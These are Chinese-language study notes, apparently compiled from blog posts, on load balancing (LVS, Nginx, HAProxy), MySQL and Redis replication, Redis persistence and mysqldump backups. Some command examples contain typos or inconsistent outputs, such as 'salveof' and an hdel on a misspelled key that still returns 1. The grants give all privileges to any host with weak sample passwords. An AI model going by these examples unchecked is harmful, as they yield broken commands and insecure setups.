<TOC />

## 架构篇

### 负载均衡（Nginx、HAProxy、DNS）
```
https://www.cnblogs.com/yuhaohao/p/12922237.html
LVS是Linux Virtual Server的缩写，意思是Linux虚拟服务器，LVS由用户空间的ipvsadm和内核空间的ipvs组成，ipvsadm用来定义规则，ipvs利用ipvsadm定义的规则工作。

Nginx是一款轻量级的Web服务器/反向代理服务器以及电子邮件(IMAP/POP3)代理服务器，并在一个BSD-like协议下发行。

HAProxy是一个使用C语言编写的自由及开放源代码软件，其提供高可用性、负载均衡以及基于TCP和HTTP的应用程序代理。

通过LVS提供的负载均衡技术和Linux操作系统实现一个高性能、高可用的服务器集群。它具有良好的可靠性、可扩展性和可操作性。从而以低廉的成本实现最优的服务性能。LVS主要特点有以下几个方面：
优势：

高并发连接：LVS基于内核网络层面工作，有超强的承载能力和并发处理能力。单台LVS负载均衡器，可支持上万并发连接。稳定性强：是工作在网络4层之上仅作分发之用，这个特点也决定了它在负载均衡软件里的性能最强、稳定性最好、对内存和CPU资源消耗极低。
成本低廉：硬件负载均衡器少则几万，多则几十万上百万，LVS只需要一台服务器就能免费部署使用，性价比极高。
配置简单：LVS配置非常简单，仅需几行命令即可配置完成，也可以写成脚本进行管理。
支持多种算法：支持多种轮调算法，可根据业务场景灵活调配进行使用，支持多种工作模型：可以根据业务场景使用不同的工作模式来解决生产环境请求处理问题。
应用范围广：因为LVS工作在4层，所以它几乎对所有应用做负载均衡，包括http、数据库、DNS、ftp服务等。
缺点：工作在四层，不支持七层规则修改，机制过于庞大，不适合小规模应用。

名称	解释
ipvsadm	用户空间的命令行工具，用于管理集群服务及集群服务上的RS等
IPVS	工作在内核上的netfilter INPUT HOOK之上的程序，可根据用户定义的集群实现请求转发
VS	Virtual Server、虚拟服务
Director,Balancer	负载均衡器，分发器
RS	Real Server 后端请求处理服务器
CIP	Client IP,客户端IP
VIP	Director Virtual IP,负载均衡器虚拟IP
DIP	Director IP,负载均衡器IP
RIP	Real Server IP,后端请求处理服务器IP
LVS常用的工作模式有：DR(直接路由)模式、TUN模式、以及NAT模式

【此部分参考：https://blog.csdn.net/gui951753/article/details/80316565】

LVS工作原理：

当客户端的请求到达负载均衡器的内核空间时，首先会到达PREROUTING链。
当内核发现请求数据包的目的地址是本机时，将数据包送往INPUT链。
LVS由用户空间的ipvsadm和内核空间的IPVS组成，ipvsadm用来定义规则，IPVS利用ipvsadm定义的规则工作，IPVS工作在INPUT链上,当数据包到达INPUT链时，首先会被IPVS检查，如果数据包里面的目的地址及端口没有在规则里面，那么这条数据包将经过INPUT链送至用户空间，交给用户空间的进程来处理。
如果数据包里面的目的地址及端口在规则里面，那么这条数据报文将被修改目的地址为事先定义好的后端服务器，并送往POSTROUTING链。
最后经由POSTROUTING链发往后端服务器。
优势：

工作在7层网络之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构、它的正则规则比HAProxy更加强大和灵活，这也是它目前广泛流行的主要原因之一，Nginx单凭这点可利用的场合就远远多余LVS了，location使用灵活、应用场合广泛，工作在应用层。
Nginx对网络稳定性的依赖比较小，理论上能ping通就可以进行负载均衡，这个也是它的优势。相反LVS对网络依赖性比较大。
Nginx安装配置简单，测试起来比较方便，它基本能把错误用日志打印出来。LVS的配置、测试就要花比较长的时间了，LVS对网络依赖比较大。
Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而不满。
Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP也是近几年非常流行的web架构，在高流量的环境中稳定性也很好。
Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可以考虑用其作为反向代理加速器。
Nginx可作为中层反向代理使用，这一层面Nginx基本上无对手，唯一可以对比Nginx的就只有lighttpd了，不过lighttpd目前还没有做到Nginx完全的功能，配置也不那么清晰易读，社区资料也远远没Nginx活跃。
Nginx也可作为静态网页和图片服务器，这方面的性能也无对手。还有Nginx社区非常活跃，第三方模块也很多。
缺点：
1.Nginx仅能支持http、https和Email协议，这样就在适用范围上面小些，这个是它的缺点。
2.对后端服务器的健康检查，只支持通过端口来检测，不支持通过url来检测。不支持Session的直接保持，但能通过ip_hash来解决

Nginx由内核和模块组成。Nginx本身做的工作实际很少，当它接到一个HTTP请求时，它仅仅是通过查找配置文件将此次请求映射到一个location block，而此location中所配置的各个指令则会启动不同的模块去完成工作，因此模块可以看做Nginx真正的劳动工作者。通常一个location中的指令会涉及一个handler模块和多个filter模块（当然，多个location可以复用同一个模块）。
handler模块负责处理请求，完成响应内容的生成，而filter模块对响应内容进行处理。用户根据自己的需要开发的模块都属于第三方模块。正是有了这么多模块的支撑，Nginx的功能才会如此强大。具体的Nginx处理流程：
1.客户端发送HTTP请求
2.Nginx基于配置文件中的位置选择一个合适的处理模块
3.负载均衡模块选择一台后端服务器 (如果有)
4.处理模块进行处理并把输出缓冲放到第一个过滤模块上
5.第一个过滤模块处理后输出给第二个过滤模块
6.然后第二个过滤模块又到第三个
7.依此类推，最后把响应发给客户端。

Nginx目前支持自带3种负载均衡策略：

轮询(rr)：按照轮询（默认）方式进行负载，每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。虽然这种方式简便、成本低廉。但缺点是：可靠性低和负载分配不均衡。
权重(weight)：指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。
upstream westos{
     server 192.168.1.1:80  weight=9;
     server 192.168.1.2:80  weight=1;
}
ip哈希(ip_hash)：上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用ip_hash了，ip_hash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。
# ip_hash： 来自同一个IP的请求会分发到相同的后端服务器
upstream westos{
     ip_hash;
     server 192.168.1.1:80;
     server 192.168.1.2:80;
}
fair：这是第三方的策略，按照后端服务器响应时间来分配请求，响应时间短的优先分配。
upstream backend{
	 fair;
     server 192.168.1.1:80;
     server 192.168.1.2:80;
}
url_hash：按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法。
upstream backend{
     hash $request_uri; 
     hash_method crc32; 
     server 192.168.1.1:80;
     server 192.168.1.2:80;
}
优点：

支持两种代理模式：TCP（四层）和HTTP（七层），支持虚拟主机；
支持Session的保持，Cookie的引导；同时支持通过获取指定的url来检测后端服务器的状态。能够补充Nginx的一些缺点。
HAProxy跟LVS类似，本身就只是一款负载均衡软件；单纯从效率上来讲HAProxy会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的。
HAProxy可以对Mysql进行负载均衡，对后端的DB节点进行检测和负载均衡。
HAProxy负载均衡策略非常多，比如：动态加权轮循(Dynamic Round Robin)，加权源地址哈希(Weighted Source Hash)，加权URL哈希和加权参数哈希(Weighted Parameter Hash)
免费开源，稳定性也是非常好，可以与LVS相媲美；
自带强大的监控服务器状态的页面，实际环境中我们结合Nagios进行邮件或短信报警；
HAProxy实现了一种事件驱动, 单一进程模型，此模型支持非常大的并发连接数。多进程或多线程模型受内存限制 、系统调度器限制以及无处不在的锁限制，很少能处理数千并发连接。事件驱动模型因为在有更好的资源和时间管理的用户空间(User-Space) 实现所有这些任务，所以没有这些问题。此模型的弊端是，在多核系统上，这些程序通常扩展性较差。这就是为什么他们必须进行优化以使每个CPU时间片(Cycle)做更多的工作

roundrobin：简单的轮询
static-rr：权重轮询
leastconn：最少连接者优先
source：根据请求源IP,这个跟Nginx的ip_hash机制类似
ri：根据请求的URI
rl_param：表示根据请求的URI参数‘balance url_param’requires an URL parameter name;
hdr(name)：根据HTTP请求头来锁定每一次HTTP请求
rdp-cookie(name)：根据cookie来锁定并哈希每一次TCP请求

```

### 主从复制（MySQL、Redis）
```
https://www.cnblogs.com/yidashi110/p/10274846.html
一、mysql(mariadb)基础
1、基础命令(centos7操作系统下)
复制代码
复制代码
1.启动mysql
systemctl start mariadb 

2.linux客户端连接自己 
mysql -uroot -p -h 127.0.0.1
    -u 用户
    -p 密码验证
    -h 连接的主机地址

3.远程链接mysql服务端
mysql -uroot -p -h 192.168.3.115

4.修改mysql密码
# 修改当前用户的密码
set password = PASSWORD('mariadb123');

# 修改其他用户的密码
set password for 'username'@'host' = PASSWORD('newpassword') 

5.创建mysql用户
create user xiaoming@'%' identified by 'xm666';

6.查询mysql库中的用户信息
use mysql;  # mysql是默认存在的库，储存着用户的信息，密码之类的
select host,user,password from  user;

7.授权语句
给小明这个用户，授予创建数据库的权限
mysql中使用grant命令对账户进行授权，grant命令常见格式如下

grant 权限 on 数据库.表名 to 账户@主机名          对特定数据库中的特定表授权
grant 权限 on 数据库.* to 账户@主机名             对特定数据库中的所有表给与授权
grant 权限1,权限2,权限3 on *.* to 账户@主机名   　对所有库中的所有表给与多个授权
grant all privileges on *.* to 账户@主机名   　　 对所有库和所有表授权所有权限

# 授予小明创建的权限，对于所有的库表生效
grant create  on *.* to xiaoming@"%";

# 创建用户并授予用户只有创建test数据库的权限
grant create  on test.* to xiaoming2@"%"  identified by 'xm2666';

# 授予用户最大的权限，所有的权限
grant all privileges on *.* to username@'%' identified by 'password';

# 刷新权限
flush privileges;  # 刷新使授权立即生效

# 查看用户权限
show grants for 'xiaoming'@'%';

8.移除权限
revoke all privileges on *.* from xiaoming@"%";
复制代码
复制代码
 

2、数据库的备份与恢复
复制代码
复制代码
# 备份
mysqldump -u root -p --all-databases > /tmp/db.sql

# 数据导入，方式有几种
第一种
source /tmp/db.sql;

第二种
mysql -uroot -p < /tmp/db.sql 

第三种
使用navicat工具

第四种，如果你数据量特别大的话
使用第三方工具 xtrabackup
复制代码
复制代码
 

二、mysql主从复制
1、mysql主从复制背景
1.如果你是单点数据库，数据库挂了，你整个项目就挂了

2.如果你是主备数据库，挂了一台主库，我可能还有千千万万个备用的数据库

3.原理
MySQL数据库的主从复制是其自带的功能，主从复制并不是复制磁盘上的数据库文件，而是通过主库的binlog日志复制到需要同步的从服务器上。
在复制的过程中，一台服务器充当主服务器（Master），接收来自用户的内容更新，而一个或多个其他的服务器充当从服务器（slave），接收来自Master上binlog文件的日志内容，解析出SQL，重新更新到Slave，使得主从服务器数据达到一致。

主从复制的逻辑有以下几种
一主一从，单向主从同步模式，只能在Master端写入数据


 

一主多从



 



 

双主主复制逻辑架构，此架构可以在Master1或Master2进行数据写入，或者两端同时写入（特殊设置）


 

4.应用场景
利用复制功能当Master服务器出现问题时，我们可以人工的切换到从服务器继续提供服务，此时服务器的数据和宕机时的数据几乎完全一致。
复制功能也可用作数据备份，但是如果人为的执行drop,delete等语句删除，那么从库的备份功能也就失效了

 

2、mysql主从复制主库的配置步骤
复制代码
复制代码
1.在matser(192.168.3.115)主库上的操作，开启主库功能
# 先把主数据库停了
systemctl stop mariadb 

# 编辑数据库的配置文件 /etc/my.cnf ，写入如下信息
[mysqld]
server-id=6  # 这个server-id只要与你从库的server-id不一样即可
log-bin=master-logbin  # 生成二进制日志，记录数据的变化

# 重启数据库
systemctl start mariadb

2.在主库创建用户，用于同步数据
create user xiaoming@'%' identified by 'xm666';

授予用户，slave从库的身份
grant replication slave on *.* to 'xiaoming'@'%';


3.锁定数据库的库表，禁止写入
这个命令是全局读锁定，执行了命令之后所有库所有表都被锁定只读。一般都是用在数据库联机备份，这个时候数据库的写操作将被阻塞，读操作顺利进行。 
解锁语句是：UNLOCK TABLES;
flush table with read lock;

记录下主库的状态，记录下，日志文件的名字，和位置
show master status; 

4.导出主库的数据
mysqldump -u root -p --all-databases > /tmp/db.sql


5.确保数据导出后，没有数据插入，完毕再查看主库状态

　　show master status;

6.远程传输主库的数据，给从库，进行导入
scp /tmp/db.sql  root@192.168.3.27:/tmp/


7.解锁主库的锁，写入数据，查看从库是否同步
unlock tables;
复制代码
复制代码
 

3、从库slave(192.168.3.27)机器的配置步骤
复制代码
复制代码
1.在从库的 /etc/my.cnf中添加参数，添加只读参数
[mysqld]
server-id=3
read-only=true


2.重启数据库
systemctl restart mariadb 

在从库中导入主库的数据
mysql -uroot -p  <  /tmp/db.sql 


3.一条语句，开启主从之间的复制关系
用root用户，进入mysql数据库，输入命令：
change master to master_host='192.168.3.115',  # 主数据库的ip
master_user='xiaoming',  # 普通用户的用户名
master_password='xm666', # 普通用户的密码
master_log_file='master-logbin.000002',  # 主库show master status;日志文件的名字
master_log_pos=492;  # 主库show master status;记录的位置

4.开启slave同步功能
start slave;

5.检查slave机器的主从是否正确
show slave status\G  查看主从同步是否正确

确保如下两条参数，是yes，即主从复制正确
Relay_Master_Log_File: master-logbin.000002
     Slave_IO_Running: Yes
    Slave_SQL_Running: Yes


6.此时mariadb数据库，请退出root用户，使用普通用户配置，因为root身份权限太大，无法达到read-only效果
6.此时mariadb数据库，请退出root用户，使用普通用户配置，因为root身份权限太大，无法达到read-only效果
6.此时mariadb数据库，请退出root用户，使用普通用户配置，因为root身份权限太大，无法达到read-only效果


7.登录一个普通用户
mysql -u xiaoming -p 

8.此时在主库写入数据，查看从库是否正确同步

9.从库无法写入数据，即为正常

10.完成主从同步，读写分离实验
复制代码
复制代码
 

三、redis基础
redis是一种高级的key：value存储系统，其中value支持五种数据类型
String: 字符串
Hash: 散列
List: 列表
Set: 集合
Sorted Set: 有序集合

 

1、strings类型
操作

复制代码
复制代码
set 　　 设置key
get      获取key
append   追加string
mset     设置多个键值对
mget     获取多个键值对
del      删除key
incr     递增+1
decr     递减-1
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> set name 'dog'  # 设置key
OK
127.0.0.1:6379> get name  # 获取value
"dog"
127.0.0.1:6379> set name 'BigDog'  # 覆盖key
OK
127.0.0.1:6379> get name  # 获取value
"BigDog"
127.0.0.1:6379> append name ' is you'  # 向name这个key追加
(integer) 13
127.0.0.1:6379> get name   # 获取value
"BigDog is you"
127.0.0.1:6379> mset age 18 hight 180 long 18.8  # 一次性设置多个键值对
OK
127.0.0.1:6379> mget age hight long  # 一次性获取多个键的值
1) "18"
2) "180"
3) "18.8"
127.0.0.1:6379> get age  # 获取value
"18"
127.0.0.1:6379> keys *  # 找到所有key
1) "long"
2) "hight"
3) "age"
4) "name"
127.0.0.1:6379> del name  # 删除key
(integer) 1
127.0.0.1:6379> get name  # 获取不存在的value，为nil
(nil)
127.0.0.1:6379> set num 10
OK
127.0.0.1:6379> get num
"10"
127.0.0.1:6379> incr num  # 递增+1
(integer) 11
127.0.0.1:6379> get num
"11"
127.0.0.1:6379> decr num  # 递减-1
(integer) 10
127.0.0.1:6379> get num
"10"
复制代码
复制代码
 

2、list类型
操作

复制代码
复制代码
lpush           从列表左边插
rpush           从列表右边插
lrange          获取一定长度的元素  lrange key  start stop(相当于获取切片的内容)
ltrim           截取一定长度列表
lpop            删除最左边一个元素
rpop            删除最右边一个元素
lpushx/rpushx   key存在则添加值，不存在不处理
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> lpush list1 'a' 'b' 'c' 'd'  # 新建一个list1，从左边放入四个元素
(integer) 4
127.0.0.1:6379> llen list1  # 查看list1的长度
(integer) 4
127.0.0.1:6379> lrange list1 0 -1  # 查看list所有元素
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> rpush list1 'haha'  # 从右边插入haha
(integer) 5
127.0.0.1:6379> lrange list1 0 -1
1) "d"
2) "c"
3) "b"
4) "a"
5) "haha"
127.0.0.1:6379> lpushx list3 'xixi'  # list3存在则添加元素，不存在则不作处理
(integer) 0
127.0.0.1:6379> ltrim list1 0 3  # 截取队列的值，从索引0取到3，删除其余的元素
OK
127.0.0.1:6379> lrange list1 0 -1
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> lpop list1  # 删除左边的第一个
"d"
127.0.0.1:6379> lrange list1 0 -1
1) "c"
2) "b"
3) "a"
127.0.0.1:6379> rpop list1  # 删除右边的第一个
"a"
127.0.0.1:6379> lrange list1 0 -1
1) "c"
2) "b"
复制代码
复制代码
 

3、set集合类型
redis的集合，是一种无序的集合，集合中的元素没有先后顺序，且集合成员是唯一的。

操作

复制代码
复制代码
sadd/srem   添加/删除 元素
sismember   判断是否为set的一个元素
smembers    返回集合所有的成员
sdiff       返回一个集合和其他集合的差异
sinter      返回几个集合的交集
sunion      返回几个集合的并集
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> sadd school class1 class2  # 添加一个名叫school的集合，有2个元素，不加引号就当做字符串处理
(integer) 2
127.0.0.1:6379> smembers school  # 查看集合school成员
1) "class1"
2) "class2"
127.0.0.1:6379> srem school class1  # 删除school的class1成员
(integer) 1
127.0.0.1:6379> smembers school
1) "class2"
127.0.0.1:6379> sismember school class1  # 是否是school的成员，不是返回0，是返回1
(integer) 0
127.0.0.1:6379> sadd school class3  # 给school添加一个新成员
(integer) 1
127.0.0.1:6379> smembers school
1) "class3"
2) "class2"
127.0.0.1:6379> sadd school2 class3 class4  # 添加一个名叫school2的集合，有2个元素
(integer) 1
127.0.0.1:6379> smembers school2
1) "class3"
2) "class4"
127.0.0.1:6379> sdiff school school2  # 找出集合school中有的，而school2中没有的元素
1) "class2"
127.0.0.1:6379> sdiff school2 school  # 找出集合school2中有的，而school中没有的元素
1) "class4"
127.0.0.1:6379> sinter school school2  # 找出school和school2的交集
1) "class3"
127.0.0.1:6379> sunion school school2  # 找出school和school2的并集(自动去重)
1) "class3"
2) "class4"
3) "class2"
复制代码
复制代码
 

4、哈希数据结构
hashes即哈希。哈希是从redis-2.0.0版本之后才有的数据结构。

hashes存的是字符串和字符串值之间的映射，比如一个用户要存储其全名、姓氏、年龄等等，就很适合使用哈希。

操作

复制代码
复制代码
hset    设置散列值
hget    获取散列值
hmset   设置多对散列值
hmget   获取多对散列值
hsetnx  如果散列已经存在，则不设置（防止覆盖key）
hkeys   返回所有keys
hvals   返回所有values
hlen    返回散列包含域（field）的数量
hdel    删除散列指定的域（field）
hexists 判断是否存在
复制代码
复制代码
 

注意

Hash不支持多次嵌套，即
"key": {'field': '不能再对应字典'}

"key": {'field': {...}}   --> 错误 
若想嵌套字典，可以json.dumps后存入，取出数据的时候可以json.loads
 

语法

复制代码
复制代码
hset key field value
结构如下
    key: {
        field1: value1,
        field2: value2,
    }
复制代码
复制代码
 

示例

复制代码
复制代码
127.0.0.1:6379> hset school name 'ChinaSchool'  # 创建一个key为school的哈希数据
(integer) 1
127.0.0.1:6379> hget school name  # 获取school的name的值
"ChinaSchool"
127.0.0.1:6379> hmset school age 100 area 2000  # 给school批量设置键值对
OK
127.0.0.1:6379> hmget school name age area  # 批量获取school的键对应的值
1) "ChinaSchool"
2) "100"
3) "2000"
127.0.0.1:6379> hkeys school  # 获取school的所有key
1) "name"
2) "age"
3) "area"
127.0.0.1:6379> hvals school  # 获取school的所有值
1) "ChinaSchool"
2) "100"
3) "2000"
127.0.0.1:6379> hlen school  # 获取school的长度
(integer) 3
127.0.0.1:6379> hexists school name  # 判断school中是否有name这个键，有就返回1，没有就返回0
(integer) 1
127.0.0.1:6379> hdel shcool area  # 删除school中的area键值对
(integer) 1
复制代码
复制代码
 

5、额外的危险操作(慎用)
复制代码
复制代码
获取redis数据库中所有的键(这个不危险)
keys *

删除所有Key，可以使用Redis的flushdb和flushall命令(危险慎用)
# 删除当前数据库中的所有Key
flushdb

# 删除所有数据库中的key
flushall
复制代码
复制代码
 

四、redis发布者订阅者
复制代码
复制代码
发布者：
PUBLISH channel msg
    将信息 message 发送到指定的频道 channel
    
频道  channel  
    自定义频道的名字

订阅者：
SUBSCRIBE channel [channel ...]
    订阅频道，可以同时订阅多个频道

UNSUBSCRIBE [channel ...]
    取消订阅指定的频道, 如果不指定频道，则会取消订阅所有频道

PSUBSCRIBE pattern [pattern ...]
    订阅一个或多个符合给定模式的频道(正则匹配)，每个模式以 * 作为匹配符，
    比如 it* 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)， 
    news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等)，诸如此类

PUNSUBSCRIBE [pattern [pattern ...]]
    退订指定的规则, 如果没有参数则会退订所有规则

PUBSUB subcommand [argument [argument ...]]
    查看订阅与发布系统状态

注意：使用发布订阅模式实现的消息队列，当有客户端订阅channel后只能收到后续发布到该频道的消息，之前发送的不会缓存，必须Provider和Consumer同时在线
复制代码
复制代码
 

五、redis数据持久化
redis的缺点：
　　redis数据放在内存中
　　重启服务器丢失数据
　　重启redis服务丢失数据
　　断电丢失数据

为了防止redis数据丢失，进行持久化，将数据，写入到一个文件中

 

1、redis持久化之RDB
redis提供了RDB持久化的功能，这个功能可以将redis在内存中的的状态保存到硬盘中，它可以手动执行。
也可以再redis.conf中配置，定期执行。
RDB持久化产生的RDB文件是一个经过压缩的二进制文件，这个文件被保存在硬盘中，redis可以通过这个文件还原数据库当时的状态。

RDB的原理是
　　基于内存的数据快照
　　定期执行数据快照
　　手动触发数据快照
　　Redis会将数据集的快照dump到dump.rdb文件中
　　可以通过配置文件来修改Redis服务器dump快照的频率

RDB优点：
　　速度快，适合做备份，主从复制就是基于RDB持久化功能实现
　　rdb通过在redis中使用save命令触发 rdb

 

1. 配置rdb数据持久化

复制代码
复制代码
1.在配置文件中，添加rdb持久化参数 
vim redis-6379.conf 
写入如下配置
port 6379           
daemonize yes           
pidfile /data/6379/redis.pid
loglevel notice        
logfile "/data/6379/redis.log"
protected-mode yes
dir /data/6379  # 定义持久化文件存储位置(rdb和aof)

dbfilename  dbmp.rdb  # rdb持久化文件
save 900 1  # rdb机制 每900秒 如果至少有1个key发生变化，则dump内存快照(相当于手动save触发rdb持久化文件)
save 300 10 # 在300秒(5分钟)之后，如果至少有10个key发生变化，则dump内存快照。
save 60 10000  # 在60秒(1分钟)之后，如果至少有10000个key发生变化，则dump内存快照。

2.触发rdb持久化，可以手动save命令,生成 dump.rdb持久化文件

3.重启redis，数据不再丢失

4. 测试
进入redis客户端
redis-cli

127.0.0.1:6379> set age 18
OK
127.0.0.1:6379> save
OK

5.进入/data/6379查看是否生成了 dbmp.rdb 持久化文件
注意：rdb数据文件是二进制文件，人为的看不懂

6.kill掉redis进程，再重启，进入redis   keys * 查看数据是否还在
复制代码
复制代码
 

2、redis持久化之aof
AOF（append-only log file）
记录服务器执行的所有变更操作命令（例如set del等），并在服务器启动时，通过重新执行这些命令来还原数据集


AOF 文件中的命令全部以redis协议的格式保存，新命令追加到文件末尾。
优点：最大程序保证数据不丢
缺点：日志记录非常大

 

1. 配置方式

 

复制代码
复制代码
1,在配置文件中，添加aof参数
参数解释：
appendonly yes  # 开启aof功能

# appendfsync选择一个策略写入配置文件即可，这里使用每分钟
appendfsync everysec # 每秒钟同步一次，该策略为AOF的缺省策略。
appendfsync always   # 每次有数据修改发生时都会写入AOF文件。
appendfsync no       # 从不同步。高效但是数据不会被持久化

配置如下：
port 6379
daemonize yes
pidfile /data/6379/redis.pid
loglevel notice
logfile "/data/6379/redis.log"
protected-mode yes
dir /data/6379
dbfilename  dbmp.rdb
save 900 1
save 300 10
save 60 10000

appendonly yes
appendfsync everysec


2,重启redis数据库，加载aof功能
会在/data/6379目录下生成 appendonly.aof 文件


3,appendonly.aof 文件是人可以看懂的记录了sql操作的文件

4,测试
进入redis客户端
redis-cli

127.0.0.1:6379> set long 18
OK

5,进入/data/6379查看appendonly.aof 文件的内容

6,kill掉redis进程，再重启，进入redis   keys * 查看数据是否还在
复制代码
复制代码
 

 

3、在不重启redis的情况下，切换rdb数据到aof数据中
 

复制代码
复制代码
1.配置redis支持rdb持久化

2.启动redis客户端，通过命令，临时切换到aof模式
127.0.0.1:6379> CONFIG set appendonly yes  # 开启AOF功能
OK
127.0.0.1:6379> CONFIG SET save ""  # 关闭RDB功能
OK

3.检查此时的数据持久化方式是rdb，还是aof，检查appendonly.aof文件，数据变动
tail -f appendonly.aof

4.此时aof还未永久生效，写入参数到配置文件
编辑redis-6379.conf 添加如下参数
appendonly yes
appendfsync everysec
复制代码
复制代码
 

4、redis持久化方式有什么区别
rdb：基于快照的持久化，速度更快，一般用作备份，主从复制也是依赖于rdb持久化功能

aof：以追加的方式记录redis操作日志的文件。可以最大程度的保证redis数据安全，类似于mysql的binlog

 

六、redis主从同步实现
原理：
1. 从服务器向主服务器发送 SYNC 命令。
2. 接到 SYNC 命令的主服务器会调用BGSAVE 命令，创建一个 RDB 文件，并使用缓冲区记录接下来执行的所有写命令。
3. 当主服务器执行完 BGSAVE 命令时，它会向从服务器发送 RDB 文件，而从服务器则会接收并载入这个文件。
4. 主服务器将缓冲区储存的所有写命令发送给从服务器执行。

小知识：
1. 在开启主从复制的时候，使用的是RDB方式的，同步主从数据的
2. 同步开始之后，通过主库命令传播的方式，主动的复制方式实现
3. 2.8以后实现PSYNC的机制，实现断线重连

 

1、使用配置文件进行redis主从同步配置
准备三个redis数据库,redis支持多实例
三个配置文件，仅仅是端口的不同

在三个配置文件中，添加主从同步的参数,
三个配置文件参数是一样的，唯一不同的是，
在从库中需要指定它的主库是谁即可，
例如6380的配置
slaveof 127.0.0.1 6379 代表这个redis库是6379的从库

 

复制代码
复制代码
1. 三个配置文件参信息如下
# redis-6379.conf(主redis)
port 6379           
daemonize yes           
pidfile /data/6379/redis.pid
loglevel notice        
logfile "/data/6379/redis.log"
dir /data/6379            
protected-mode yes 
dbfilename  dbmp.rdb
save 900 1
save 300 10 
save 60 10000


# redis-6380.conf(从redis)
port 6380           
daemonize yes           
pidfile /data/6380/redis.pid
loglevel notice        
logfile "/data/6380/redis.log"
dir /data/6380            
protected-mode yes 
dbfilename  dbmp.rdb
save 900 1
save 300 10 
save 60 10000
slaveof  127.0.0.1 6379


# redis-6381.conf(从redis)
port 6381           
daemonize yes           
pidfile /data/6381/redis.pid
loglevel notice        
logfile "/data/6381/redis.log"
dir /data/6381            
protected-mode yes 
dbfilename  dbmp.rdb
save 900 1
save 300 10 
save 60 10000
slaveof  127.0.0.1 6379


2.启动三个redis实例
redis-server redis-6379.conf
redis-server redis-6380.conf
redis-server redis-6381.conf

3.查看主从同步身份
1,redis-cli -p 6379  info replication 
# Replication
role:master
connected_slaves:2
slave0:ip=127.0.0.1,port=6380,state=online,offset=28,lag=1
slave1:ip=127.0.0.1,port=6381,state=online,offset=28,lag=1


2,redis-cli -p 6380  info replication 
# Replication
role:slave
master_host:127.0.0.1
master_port:6379


3,redis-cli -p 6381  info replication 
# Replication
role:slave
master_host:127.0.0.1
master_port:6379

4.测试
# 在6379主库
redis-cli -p 6379

127.0.0.1:6379> set uzi good
OK

# 在6380从库
redis-cli -p 6380

127.0.0.1:6380> get uzi
"good"

# 在6381从库
redis-cli -p 6381

127.0.0.1:6381> get uzi
"good"
复制代码
复制代码
 

2、使用命令行进行redis主从同步配置
复制代码
复制代码
1. 6380/6381命令行
redis-cli -p 6380
127.0.0.1:6380> SLAVEOF 127.0.0.1 6379  #指明主库的地址

redis-cli -p 6381
127.0.0.1:6381> SLAVEOF 127.0.0.1 6379  #指明主库的地址


2. 检查主从状态
主库：
127.0.0.1:6379> info replication

从库：
127.0.0.1:6380> info replication
127.0.0.1:6381> info replication
复制代码
复制代码
 

3、如果我主库挂了怎么办
复制代码
复制代码
解决方案：手动切换主从身份，选举一个新的主库
1.干掉6379主库
redis-cli -p 6379 shutdown

2.在6380上关闭自己的slave身份
127.0.0.1:6380> slaveof no one 

3.在6381上给与新的主人身份
127.0.0.1:6381> salveof  127.0.0.1  6380 

4.修改完毕，还得修改配置文件，永久生效

```

### 数据冗余、备份（MySQL增量、全量 原理）
```
https://www.cnblogs.com/abeli/p/6725201.html
在日常运维工作中，对mysql数据库的备份是万分重要的，以防在数据库表丢失或损坏情况出现，可以及时恢复数据。

下面对这种备份方案详细说明下：
1.MySQLdump增量备份配置
执行增量备份的前提条件是MySQL打开binlog日志功能，在my.cnf中加入
log-bin=/opt/Data/MySQL-bin
“log-bin=”后的字符串为日志记载目录，一般建议放在不同于MySQL数据目录的磁盘上。

 

　　mysqldump >       导出数据
 

　　mysql <           导入数据  （或者使用source命令导入数据，导入前要先切换到对应库下）
 

 

注意一个细节：
 

若是mysqldump导出一个库的数据，导出文件为a.sql，然后mysql导入这个数据到新的空库下。
 

如果新库名和老库名不一致，那么需要将a.sql文件里的老库名改为新库名，
 

这样才能顺利使用mysql命令导入数据（如果使用source命令导入就不需要修改a.sql文件了）。
2.MySQLdump增量备份
假定星期日下午1点执行全量备份，适用于MyISAM存储引擎。
[root@test-huanqiu ~]# MySQLdump --lock-all-tables --flush-logs --master-data=2 -u root -p test > backup_sunday_1_PM.sql

对于InnoDB将--lock-all-tables替换为--single-transaction
--flush-logs为结束当前日志，生成新日志文件；
--master-data=2 选项将会在输出SQL中记录下完全备份后新日志文件的名称，

用于日后恢复时参考，例如输出的备份SQL文件中含有：
CHANGE MASTER TO MASTER_LOG_FILE=’MySQL-bin.000002′, MASTER_LOG_POS=106;

3.MySQLdump增量备份其他说明：
如果MySQLdump加上–delete-master-logs 则清除以前的日志，以释放空间。但是如果服务器配置为镜像的复制主服务器，用MySQLdump –delete-master-logs删掉MySQL二进制日志很危险，因为从服务器可能还没有完全处理该二进制日志的内容。在这种情况下，使用 PURGE MASTER LOGS更为安全。

